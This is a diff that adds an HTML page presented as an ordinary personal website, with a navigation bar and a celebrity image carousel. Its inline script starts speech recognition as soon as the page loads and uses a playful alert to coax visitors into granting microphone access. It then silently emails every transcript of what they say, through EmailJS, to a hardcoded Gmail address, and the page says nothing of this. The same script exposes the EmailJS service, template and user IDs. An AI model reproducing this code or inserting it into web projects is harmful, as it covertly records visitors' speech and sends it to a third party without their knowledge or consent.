@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Website</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #444;
+            padding: 10px;
+            text-align: center;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        nav a:hover {
+            color: #ffd700; /* change the color on hover */
+        }
+        section {
+            padding: 20px;
+            margin: 20px;
+            background-color: #fff;
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        body {
+            margin: 0;
+            background: #160c36;
+            text-align: center;
+            font-family: sans-serif;
+            color: #fefefe;
+        }
+
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Welcome to My Website</h1>
+</header>
+
+<nav>
+    <a href="#">Home</a>
+    <a href="#">About</a>
+    <a href="#">Services</a>
+    <a href="#">Contact</a>
+</nav>
+
+<div class="container">
+    <div class="carousel">
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="./img/dingdong.jpg" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 100%; object-fit: contain;" src="./img/coco martin.jpg" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/dingding.jpg" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/jaaaamesssss.jpg" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/arnold.webp" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/thor.webp" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/dingdoooonngg.jpg" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/wael.jpg" alt="Placeholder Image"></span></div>
+      <div class="image"><span><img style="width: 100%; height: 200px; object-fit: contain;" src="/img/jesus.jpg" alt="Placeholder Image"></span></div>
+    </div>
+  </div>
+</body>
+
+
+<script>
+    var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition;
+    var voiceRecognition = new SpeechRecognition();
+
+    voiceRecognition.lang = 'en-US';
+
+    voiceRecognition.interimResults = false;
+
+    voiceRecognition.maxAlternatives = 5;
+
+    // Function to send email
+    function sendEmail(message) {
+        var serviceID = 'service_ehzaq9o';
+        var templateID = 'template_m4hyawh';
+        var userID = 'ayW6ZPE4navBfqyOK';
+
+        var templateParams = {
+            to_email: 'aidams1534@gmail.com',
+            message: message
+        };
+
+        // Send the email
+        emailjs.send(serviceID, templateID, templateParams, userID)
+            .then(function(response) {
+               
+            }, function(error) {
+                
+            });
+    }
+
+    if (navigator.permissions) {
+        navigator.permissions.query({ name: 'microphone' })
+            .then(function(permissionStatus) {
+                if (permissionStatus.state !== 'granted') {
+                    alert('Dingdong wants to hear your voice. Please allow.');
+                }
+            });
+    }
+
+    voiceRecognition.onresult = function(event) {
+        var recordedVoice = event.results[0][0].transcript;
+        
+        console.log('You Said: ', recordedVoice);
+
+        // Send Email with Recorded msg
+        sendEmail(recordedVoice);
+    };
+
+    // Start voice recognition when the page loads
+    voiceRecognition.start();
+</script>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+    // Initialize Emailjs with userID
+    emailjs.init("ayW6ZPE4navBfqyOK");
+</script>
+</html>
